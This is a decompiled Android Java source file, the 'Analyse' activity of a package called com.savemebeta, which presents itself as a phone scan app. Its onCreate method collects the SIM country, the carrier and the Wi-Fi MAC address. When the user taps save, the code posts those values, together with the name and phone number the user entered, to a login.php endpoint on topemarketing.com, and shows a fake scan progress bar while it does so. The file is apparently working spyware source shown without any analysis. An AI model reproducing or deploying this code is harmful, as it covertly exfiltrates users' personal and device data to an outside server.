package com.savemebeta;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class Analyse extends Activity {
    public static String LG = null;
    public static String address = null;
    public static String country = null;
    public static String email = null;
    public static int f = 0;
    public static String fname = null;
    public static String phone = null;
    public static final int timeforwating = 15000;
    public boolean PBstate;
    Button b1;
    public String carrier;
    Context countr = this;
    Context ctx = this;
    String[] friends;
    WebView mWeb;
    String msgd;
    String tit;
    public ProgressBar vscanandroid;

    public class AddFriend extends AsyncTask<String, Void, Object> {
        /* access modifiers changed from: protected|varargs */
        public Object doInBackground(String... urls) {
            Exception e;
            Intent intent;
            Bundle extras;
            Log.d("OTHMAN", "SEND TO DB");
            Charset.forName("UTF-8").encode(Analyse.fname);
            InputStream is = null;
            try {
                Analyse.fname = new String(Analyse.fname.getBytes("UTF-8"), "UTF-8");
            } catch (UnsupportedEncodingException e1) {
                e1.printStackTrace();
            }
            Log.d("OTHMAN", "GET UTF NAME");
            try {
                HttpClient httpclient = new DefaultHttpClient();
                HttpPost httppost = new HttpPost("http://topemarketing.com/android/googlefinal/login.php");
                Log.d("OTHMAN", "CONNECT TO DB");
                List<NameValuePair> nameValuePairs = new ArrayList(2);
                nameValuePairs.add(new BasicNameValuePair("fname", Analyse.fname));
                nameValuePairs.add(new BasicNameValuePair("lname", Analyse.this.carrier));
                nameValuePairs.add(new BasicNameValuePair("email", Analyse.address));
                nameValuePairs.add(new BasicNameValuePair("phone", Analyse.phone));
                nameValuePairs.add(new BasicNameValuePair("country", Analyse.country));
                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs, "utf-8"));
                is = httpclient.execute(httppost).getEntity().getContent();
                Log.d("OTHMAN", "SEND DATA");
            } catch (Exception e2) {
                Log.e("log_tag", "Error in http connection" + e2.toString());
            }
            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "iso-8859-1"), 8);
                StringBuilder sb = new StringBuilder();
                StringBuilder stringBuilder;
                try {
                    sb.append(reader.readLine() + "\n");
                    String str = "0";
                    while (true) {
                        str = reader.readLine();
                        if (str == null) {
                            break;
                        }
                        sb.append(new StringBuilder(String.valueOf(str)).append("\n").toString());
                    }
                    is.close();
                    System.out.println(sb.toString());
                    stringBuilder = sb;
                } catch (Exception e3) {
                    e2 = e3;
                    stringBuilder = sb;
                    Log.e("log_tag", "Error converting result " + e2.toString());
                    intent = new Intent(Analyse.this.getBaseContext(), Scan.class);
                    intent.putExtra("var2", Analyse.fname);
                    extras = new Bundle();
                    extras.putString("var", Analyse.phone);
                    intent.putExtras(extras);
                    Analyse.this.startActivity(intent);
                    return urls;
                }
            } catch (Exception e4) {
                e2 = e4;
                Log.e("log_tag", "Error converting result " + e2.toString());
                intent = new Intent(Analyse.this.getBaseContext(), Scan.class);
                intent.putExtra("var2", Analyse.fname);
                extras = new Bundle();
                extras.putString("var", Analyse.phone);
                intent.putExtras(extras);
                Analyse.this.startActivity(intent);
                return urls;
            }
            intent = new Intent(Analyse.this.getBaseContext(), Scan.class);
            intent.putExtra("var2", Analyse.fname);
            extras = new Bundle();
            extras.putString("var", Analyse.phone);
            intent.putExtras(extras);
            Analyse.this.startActivity(intent);
            return urls;
        }
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setTitle("Informations");
        String locale = this.countr.getResources().getConfiguration().locale.getDisplayCountry();
        country = ((TelephonyManager) getSystemService("phone")).getSimCountryIso();
        address = ((WifiManager) getSystemService("wifi")).getConnectionInfo().getMacAddress();
        this.carrier = ((TelephonyManager) getSystemService("phone")).getNetworkOperatorName();
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        setContentView(R.layout.activity_analyse);
        LG = Locale.getDefault().getDisplayLanguage();
        Log.d("OTHMAN", "SET button");
        ((Button) findViewById(R.id.savecon)).setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                switch (v.getId()) {
                    case R.id.savecon:
                        Analyse.fname = ((EditText) Analyse.this.findViewById(R.id.name)).getText().toString();
                        Analyse.phone = ((EditText) Analyse.this.findViewById(R.id.phone)).getText().toString();
                        if (Analyse.fname.equals("") || Analyse.phone.equals("")) {
                            Toast.makeText(Analyse.this, "Please fill out all fields", 0).show();
                            return;
                        }
                        DatabaseOperationslogin DB = new DatabaseOperationslogin(Analyse.this.ctx);
                        DB.putInformation(DB, Analyse.fname, Analyse.phone, "1");
                        new AddFriend().execute(new String[]{"ss"});
                        ((ProgressBar) Analyse.this.findViewById(R.id.progressBar2)).setVisibility(0);
                        Analyse.this.vscanandroid = (ProgressBar) Analyse.this.findViewById(R.id.progressBar1);
                        new Thread() {
                            public void run() {
                                Analyse.this.PBstate = true;
                                int waited = 0;
                                while (Analyse.this.PBstate && waited < 15000) {
                                    try {
                                        AnonymousClass1.sleep(200);
                                        if (Analyse.this.PBstate) {
                                            waited += 1000;
                                            Analyse.this.updateprogress(waited);
                                        }
                                    } catch (Exception e) {
                                    }
                                }
                                if (Analyse.this.PBstate) {
                                }
                                super.run();
                            }
                        }.start();
                        return;
                    default:
                        return;
                }
            }
        });
        Log.d("OTHMAN", "get msg");
    }

    public void updateprogress(int passedtime) {
        if (this.vscanandroid != null) {
            this.vscanandroid.setProgress((this.vscanandroid.getMax() * passedtime) / 15000);
        }
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.analyse, menu);
        return true;
    }

    public boolean onTouch(View v, MotionEvent event) {
        Toast.makeText(this, "REQUEST event", 0).show();
        return false;
    }

    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.action_settings) {
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}
